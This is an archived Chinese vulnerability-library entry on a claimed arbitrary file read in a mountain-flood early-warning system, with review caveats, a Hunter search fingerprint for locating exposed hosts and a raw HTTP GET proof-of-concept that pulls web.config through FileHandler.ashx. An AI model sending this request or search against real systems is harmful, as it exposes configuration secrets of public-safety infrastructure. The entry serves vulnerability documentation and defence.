---
source: "wy876 漏洞文库"
title: "万江港利山洪灾害防治预警系统 FileHandler Download任意路径读取声称"
product: "万江港利山洪灾害防治预警系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "Windows绝对安装目录固定，版本未知"
prerequisites: "请求无凭据，鉴权未知"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/oeggkvpxmlddh3qv"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E4%B8%87%E6%B1%9F%E6%B8%AF%E5%88%A9/%E4%B8%87%E6%B1%9F%E6%B8%AF%E5%88%A9%E5%B1%B1%E6%B4%AA%E7%81%BE%E5%AE%B3%E9%A2%84%E8%AD%A6%E7%B3%BB%E7%BB%9FFileHandler%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "web.body="
hunter: "web.body=\"万江港利\"&&web.body=\"山洪灾害\""
id: "vw-803c92a7db0ff59daf7c43fd"
entity_id: "ve-803c92a7db0ff59daf7c43fd"
schema_version: "1"
---

# 万江港利山洪灾害防治预警系统 FileHandler Download任意路径读取声称

## 条目说明

- 对象与具体问题：万江港利山洪灾害防治预警系统；FileHandler Download任意路径读取声称
- 版本、配置及部署条件：Windows绝对安装目录固定，版本未知
- 认证与权限前提：请求无凭据，鉴权未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- E:/SCWJ/Official/Web/MFCW为特定实例路径，需要路径来源或通用条件，不可默认全产品一致
- 只请求web.config无响应/根因/修复，不能直接推出大量敏感信息
- Hunter指纹在fofa字段残缺；压缩大段历史技术营销介绍

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
万江港利山洪灾害防治预警系统软件是对空间信息技术、计算机网络技术、现代通信技术进行无缝集成，结合灾害监测预警的业务需求，采用世界领先GIS地理信息处理技术、RS遥感技术、GPRS/CMDA/3G通讯技术、Microsoft Silverlight Web前端应用程式开发解决方案、以及大容量数据采集技术和大容量数据存储等计算机网络通信与数据处理技术，建立一个用户界面友好的、多终端的、可定制的、集数据采集、存储、分析于一体的综合地理信息平台。该系统存在任意文件读取漏洞，攻击者可获取大量敏感信息。

## 二、影响版本
+ 万江港利山洪灾害防治预警系统

## 三、资产测绘
+ hunter`web.body="万江港利"&&web.body="山洪灾害"`
+ 特征


## 四、漏洞复现
```http
GET /Service/FileHandler.ashx?Action=Download&FileDirectory=E:/SCWJ/Official/Web/MFCW/&FileName=web.config&FileSourceName=web HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/oeggkvpxmlddh3qv>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
